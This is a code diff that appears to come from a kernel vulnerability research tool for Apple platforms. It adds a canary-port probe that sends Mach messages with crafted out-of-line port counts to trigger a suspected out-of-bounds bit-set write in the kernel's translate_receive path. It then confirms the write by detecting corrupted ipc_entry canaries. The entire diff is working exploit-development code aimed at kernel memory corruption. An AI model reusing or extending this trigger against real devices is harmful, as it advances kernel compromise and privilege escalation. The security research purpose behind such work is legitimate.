@@ -370,6 +370,92 @@
         [report appendString:@"Next: debugserver watchpoints on the ports array alloc.\n"];
     }
 
+    // --- translate_receive bit-set canary ---
+    // Allocate 128 canary ports. Snapshot their urefs. Trigger translate_receive
+    // with various w2 values (OOL counts). Snapshot again. Any delta = bit-set hit.
+    [report appendString:@"\n--- translate_receive bit-set canary (128 ports) ---\n"];
+    #define CANARY_N 128
+    mach_port_t canary[CANARY_N];
+    uint32_t canaryAlive[CANARY_N];
+    for (int i = 0; i < CANARY_N; i++) {
+        canary[i] = MACH_PORT_NULL;
+        kern_return_t ckr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &canary[i]);
+        if (ckr == KERN_SUCCESS) {
+            mach_port_insert_right(mach_task_self(), canary[i], canary[i], MACH_MSG_TYPE_MAKE_SEND);
+            canaryAlive[i] = 1;
+        } else {
+            canaryAlive[i] = 0;
+        }
+    }
+
+    // Snapshot: try to send to each canary port (alive check)
+    uint8_t pingBuf[256];
+    for (int i = 0; i < CANARY_N; i++) {
+        if (!canaryAlive[i]) continue;
+        memset(pingBuf, 0, sizeof(pingBuf));
+        mach_msg_header_t *ph = (mach_msg_header_t *)pingBuf;
+        ph->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+        ph->msgh_size = sizeof(mach_msg_header_t);
+        ph->msgh_remote_port = canary[i];
+        ph->msgh_local_port = MACH_PORT_NULL;
+        ph->msgh_id = 0;
+        kern_return_t skr = mach_msg(ph, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                     ph->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
+        if (skr != KERN_SUCCESS) canaryAlive[i] = 2; // was already dead
+        else {
+            // drain
+            mach_msg(ph, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(pingBuf), canary[i], 50, MACH_PORT_NULL);
+        }
+    }
+    int aliveBefore = 0;
+    for (int i = 0; i < CANARY_N; i++) if (canaryAlive[i] == 1) aliveBefore++;
+    [report appendFormat:@"canary before: %d/%d alive\n", aliveBefore, CANARY_N];
+
+    // Trigger translate_receive with w2 values across the suspected range.
+    // These OOL counts are the w2 index in the 16-byte-stride table.
+    uint32_t triggerCounts[] = {65, 66, 74, 75, 76, 80, 96, 128, 192, 256};
+    for (size_t t = 0; t < sizeof(triggerCounts)/sizeof(triggerCounts[0]); t++) {
+        NSDictionary *tr = [self sendOOLPortsCount:triggerCounts[t] realEntries:64 port:port sendRight:port];
+        [self journal:[NSString stringWithFormat:@"bit_set_trigger w2=%u send_kr=%@ recv_kr=%@",
+                       triggerCounts[t], tr[@"send_kr"], tr[@"recv_kr"]]];
+    }
+
+    // Snapshot again
+    int changed = 0;
+    for (int i = 0; i < CANARY_N; i++) {
+        if (canaryAlive[i] != 1) continue;
+        memset(pingBuf, 0, sizeof(pingBuf));
+        mach_msg_header_t *ph = (mach_msg_header_t *)pingBuf;
+        ph->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+        ph->msgh_size = sizeof(mach_msg_header_t);
+        ph->msgh_remote_port = canary[i];
+        ph->msgh_local_port = MACH_PORT_NULL;
+        ph->msgh_id = 0;
+        kern_return_t skr = mach_msg(ph, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                     ph->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
+        if (skr != KERN_SUCCESS) {
+            changed++;
+            [report appendFormat:@"canary[%d] port=%u DEAD after trigger (send_kr=%d)\n", i, canary[i], skr];
+        } else {
+            mach_msg(ph, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(pingBuf), canary[i], 50, MACH_PORT_NULL);
+        }
+    }
+    int aliveAfter = 0;
+    for (int i = 0; i < CANARY_N; i++) if (canaryAlive[i] == 1) aliveAfter++;
+    [report appendFormat:@"canary after: %d/%d alive (changed=%d)\n", aliveAfter, CANARY_N, changed];
+    if (changed > 0) {
+        [report appendString:@"BIT-SET LANDED — translate_receive OOB write CONFIRMED.\n"];
+        [report appendString:@"Dead canaries = corrupted ipc_entry bits at the w2 offset.\n"];
+    } else {
+        [report appendString:@"No canary change — bit-set may hit unmapped memory (no panic = mapped),\n"];
+        [report appendString:@"or translate_receive not reached. Next: debugserver watchpoints.\n"];
+    }
+
+    // Cleanup canaries
+    for (int i = 0; i < CANARY_N; i++) {
+        if (canary[i] != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), canary[i]);
+    }
+
     [report appendString:@"\n--- itable churn + burst (growth boundary) ---\n"];
     for (int round = 0; round < 4; round++) {
         [self churnItableWithPorts:held count:256];
